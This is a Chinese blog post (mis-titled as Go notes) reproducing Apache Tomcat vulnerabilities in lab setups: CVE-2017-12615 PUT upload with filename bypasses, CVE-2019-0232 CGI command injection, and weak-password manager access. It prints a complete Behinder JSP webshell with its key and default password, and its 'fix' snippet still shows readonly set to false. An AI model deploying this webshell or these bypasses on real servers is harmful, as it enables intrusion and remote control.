<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="Tomcat                           安装       首先要有java的环境 注意：Tomcat的版本对与JAVA版本以及相应的JSP和 Servlet都是有要求的，Tomcat8版本以上的是需要Java7及以后的版本，所以需要对应JDK的版本来下载Tomcat的版本  然后安装Tomcat  一路默认下来 就ok了  可以看到">
<meta property="og:type" content="article">
<meta property="og:title" content="go语言知识点">
<meta property="og:url" content="http://example.com/2021/05/10/Tomcat/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Tomcat                           安装       首先要有java的环境 注意：Tomcat的版本对与JAVA版本以及相应的JSP和 Servlet都是有要求的，Tomcat8版本以上的是需要Java7及以后的版本，所以需要对应JDK的版本来下载Tomcat的版本  然后安装Tomcat  一路默认下来 就ok了  可以看到">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619271446048.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619263844479.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619263320303.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619275501351.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619276500737.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619276550079.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619279493073.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619279550159.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619279602920.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619279695848.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619279779246.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619280114887.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619280208227.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619280600919.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619280689842.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619281552614.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619281576850.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619281594138.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619281681804.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619316374088.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619316427883.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619316466768.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619316534173.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619316568424.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619317164402.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619317181551.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619317197793.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619317352951.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619326835356.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619326964457.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619327075870.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619327411223.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619327400322.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619327485133.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619329013757.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619329131808.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619329484692.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619329494731.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619329569867.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619329613901.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619329717080.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619329890433.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619339840138.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619339862773.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619339911577.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619332041600.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619340379288.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619340324001.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619340439690.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619340998143.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619341538485.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619341565301.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619341609504.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619341768817.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619341811564.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619342044653.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619342139990.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619342352290.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619342430579.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619342458443.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619342481874.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619348867355.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619349787403.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619349894166.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619350245468.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619350478774.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619350649495.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619351018857.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619351185840.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619351175429.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619351850151.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619351998810.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619352574611.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619352504843.png">
<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619352730021.png">
<meta property="article:published_time" content="2021-05-10T11:27:46.817Z">
<meta property="article:modified_time" content="2021-05-10T11:28:42.009Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Tomcat">
<meta property="article:tag" content="中间件">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619271446048.png"><title>go语言知识点 | Hexo</title><link ref="canonical" href="http://example.com/2021/05/10/Tomcat/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">go语言知识点</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-05-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-05-10</span></span></div></header><div class="post-body">
        <h1 id="Tomcat"   >
          <a href="#Tomcat" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1>
      
        <h2 id="安装"   >
          <a href="#安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装" class="headerlink" title="安装"></a>安装</h2>
      <p>首先要有java的环境</p>
<p><strong>注意：Tomcat的版本对与JAVA版本以及相应的JSP和 Servlet都是有要求的，Tomcat8版本以上的是需要Java7及以后的版本，所以需要对应JDK的版本来下载Tomcat的版本</strong></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619271446048.png" alt="1619271446048"></p>
<p>然后安装Tomcat  一路默认下来 就ok了</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619263844479.png" alt="1619263844479"></p>
<p>可以看到它的8080端口 已经开启了</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619263320303.png" alt="1619263320303"></p>
<p>访问一下</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619275501351.png" alt="1619275501351"></p>

        <h2 id="Tomcat分析"   >
          <a href="#Tomcat分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat分析" class="headerlink" title="Tomcat分析"></a>Tomcat分析</h2>
      
        <h3 id="主要文件"   >
          <a href="#主要文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#主要文件" class="headerlink" title="主要文件"></a>主要文件</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.server.xml：配置 tomcat启动的端口号、host主机、Context等</span><br><span class="line">2.web.xml:部署描述文件，这个web.xml中描述了一些默认的 servlet，部署每个 webapp时，都会调用这个文件，配置该web应用的默认 servlet </span><br><span class="line">3：tomcat-users.xml:tomcat的用户密码与权限。</span><br></pre></td></tr></table></div></figure>

<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619276500737.png" alt="1619276500737"></p>

        <h3 id="上传目录"   >
          <a href="#上传目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#上传目录" class="headerlink" title="上传目录"></a>上传目录</h3>
      <p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619276550079.png" alt="1619276550079"></p>

        <h2 id="Tomcat渗透"   >
          <a href="#Tomcat渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat渗透" class="headerlink" title="Tomcat渗透"></a>Tomcat渗透</h2>
      
        <h3 id="Tomcat任意文件写入-CVE-2017-12615）"   >
          <a href="#Tomcat任意文件写入-CVE-2017-12615）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat任意文件写入-CVE-2017-12615）" class="headerlink" title="Tomcat任意文件写入(CVE-2017-12615）"></a>Tomcat任意文件写入(CVE-2017-12615）</h3>
      
        <h4 id="影响范围"   >
          <a href="#影响范围" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4>
      <p>Apache Tomcat7.0.0-7.0.81（默认配置）</p>

        <h4 id="复现"   >
          <a href="#复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#复现" class="headerlink" title="复现"></a>复现</h4>
      <p>这边我用vulhub</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start </span><br><span class="line">cd vulhub/tomcat/CVE-2017-12615</span><br><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></div></figure>

<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619279493073.png" alt="1619279493073"></p>
<p>去底层看看源码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps</span><br><span class="line">sudo docker exec -ti a3 bash</span><br><span class="line">cat conf/web.xml |grep readonly</span><br></pre></td></tr></table></div></figure>



<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619279550159.png" alt="1619279550159"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619279602920.png" alt="1619279602920"></p>

        <h4 id="漏洞原理"   >
          <a href="#漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4>
      <p>产生是由于配置不当（非默认配置），将配置文件<br>conf/web.xml）中的 readonly设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法</p>

        <h4 id="开始复现"   >
          <a href="#开始复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h4>
      <p>抓包  改位PUT  上传方式</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619279695848.png" alt="1619279695848"></p>
<p>去上传目录看看</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/tomcat/webapps/ROOT</span><br></pre></td></tr></table></div></figure>



<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619279779246.png" alt="1619279779246"></p>
<p>成功上传</p>

        <h5 id="绕过，成功上传jsp"   >
          <a href="#绕过，成功上传jsp" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过，成功上传jsp" class="headerlink" title="绕过，成功上传jsp"></a>绕过，成功上传jsp</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Windows下不允许文件以空格结尾</span><br><span class="line">以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格</span><br><span class="line">2.WindowsNTFS流</span><br><span class="line">Put/dayU1.jsp：：SdaTa Http/1.13./在文件名中是非法的，也会被去除（Linux/Windows）</span><br><span class="line">Put/dayu2.jsp/http:/1.1</span><br></pre></td></tr></table></div></figure>



<p>可以看到上传a001.jsp 是成功绕过了</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619280114887.png" alt="1619280114887"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619280208227.png" alt="1619280208227"></p>
<p>其他两种我就不进行演示了 </p>
<p>都是可以的</p>
<p>上传马儿，这边我用冰蝎进行连接</p>
<p><strong>注意：不能开代理</strong></p>
<p>看看冰蝎server目录下的jsp马儿</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619280600919.png" alt="1619280600919"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619280689842.png" alt="1619280689842"></p>
<p>冰蝎的jsp马儿</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></div></figure>



<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br></pre></td></tr></table></div></figure>



<p>注意这边要用<code>/</code>进行绕过,上传jsp</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619281552614.png" alt="1619281552614"></p>
<p>也可以看到是成功上传的</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619281576850.png" alt="1619281576850"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619281594138.png" alt="1619281594138"></p>
<p>用冰蝎进行连接一下</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619281681804.png" alt="1619281681804"></p>

        <h5 id="最新版本复现"   >
          <a href="#最新版本复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#最新版本复现" class="headerlink" title="最新版本复现"></a>最新版本复现</h5>
      <p>这边把这个漏洞的代码 粘贴进最新的版本</p>
<p>不加的话  PUT 上传txt都是不可以的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line"> &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line"> &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></div></figure>



<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619316374088.png" alt="1619316374088"></p>
<p>保存退出 进行重启Tomcat</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619316427883.png" alt="1619316427883"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619316466768.png" alt="1619316466768"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619316534173.png" alt="1619316534173"></p>
<p>确实是可以成功写入的</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619316568424.png" alt="1619316568424"></p>
<p>进行PUT写入txt 发现它是可以的</p>
<p>但是绕过，上传jsp  三种方法我都试了  是不行的</p>

        <h6 id="修复"   >
          <a href="#修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#修复" class="headerlink" title="修复"></a>修复</h6>
      <p>把readonly 改成true</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;</span><br></pre></td></tr></table></div></figure>


        <h3 id="Tomcat远程代码执行（CVE-2019-0232）"   >
          <a href="#Tomcat远程代码执行（CVE-2019-0232）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat远程代码执行（CVE-2019-0232）" class="headerlink" title="Tomcat远程代码执行（CVE-2019-0232）"></a>Tomcat远程代码执行（CVE-2019-0232）</h3>
      
        <h4 id="影响范围-1"   >
          <a href="#影响范围-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.0.0.M1 to 9.0.17Apache Tomcat 8.5.0 to 8.5.39Apache Tomcat 7.0.0 to 7.0.93</span><br></pre></td></tr></table></div></figure>



<p>这边就用 Windows 8.5.39 进行复现</p>

        <h4 id="安装-1"   >
          <a href="#安装-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4>
      <p>同样是先安装java</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619317164402.png" alt="1619317164402"></p>
<p>然后安装Tomcat</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619317181551.png" alt="1619317181551"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619317197793.png" alt="1619317197793"></p>
<p>访问一下</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619317352951.png" alt="1619317352951"></p>

        <h4 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4>
      <p>Tomcat的 CGI_Servlet组件默认是关闭的，在<code>conf/web.xml</code>中找到注释的 CGIServlet部分，去掉注释，并配置 enableCmdLineArguments和executable</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619326835356.png" alt="1619326835356"></p>
<p>就是配置这里</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;    &lt;init-param&gt;        &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;        &lt;param-value&gt;WEB-INF/cgi&lt;/param-value&gt;    &lt;/init-param&gt;	&lt;init-param&gt;        &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt;		&lt;param-value&gt;true&lt;/param-value&gt;	&lt;/init-param&gt;	&lt;init-param&gt;	    &lt;param-name&gt;executable&lt;/param-name&gt;	    &lt;param-value&gt;&lt;/param-value&gt;	&lt;/init-param&gt;    &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;&lt;/servlet&gt;</span><br></pre></td></tr></table></div></figure>



<p>这里主要的设置是enableCmdLineArguments和 executable两个选项</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.enableCmdLineArguments启用后才会将Url中的参数传递到命令行2.executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。</span><br></pre></td></tr></table></div></figure>



<p>同样在conf/web.xml中启用cgi的 servlet-mapping</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619326964457.png" alt="1619326964457"></p>
<p>修改conf/context.xml的添加 privileged=”true”属性，否则会没有权限</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context privileged=&quot;true&quot;&gt;</span><br></pre></td></tr></table></div></figure>





<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619327075870.png" alt="1619327075870"></p>
<p>配置目录文件</p>
<p>在<code>C:\Tomcat\webapps\ROOT\WEB-INF</code>下创建<code>cgi-bin</code>目录</p>
<p>并在该目录下创建一个a001.txt</p>
<p>里面内容随意</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619327411223.png" alt="1619327411223"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619327400322.png" alt="1619327400322"></p>
<p>记得重启一下</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619327485133.png" alt="1619327485133"></p>
<p>然后我们访问</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.175.193:8080/cgi-bin/a001.bat?&amp;dir</span><br></pre></td></tr></table></div></figure>




        <h3 id="Tomcat弱口令-amp-后台getshell漏洞"   >
          <a href="#Tomcat弱口令-amp-后台getshell漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat弱口令-amp-后台getshell漏洞" class="headerlink" title="Tomcat弱口令&amp;后台getshell漏洞"></a>Tomcat弱口令&amp;后台getshell漏洞</h3>
      
        <h4 id="影响范围-2"   >
          <a href="#影响范围-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h4>
      <p>Tomcat8</p>
<p>这边就还是用vulhub进行复现</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/tomcat/tomcat8sudo docker-compose up -d</span><br></pre></td></tr></table></div></figure>

<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619329013757.png" alt="1619329013757"></p>
<p>之前的容器要关掉</p>
<p>去docker底层看看它的源码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pssudo docker exec -ti a bashcd conf</span><br></pre></td></tr></table></div></figure>

<p>把这三个文件复制出来</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xml /home/dayu/Desktop/sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xsd /home/dayu/Desktop/sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/web.xml /home/dayu/Desktop/</span><br></pre></td></tr></table></div></figure>





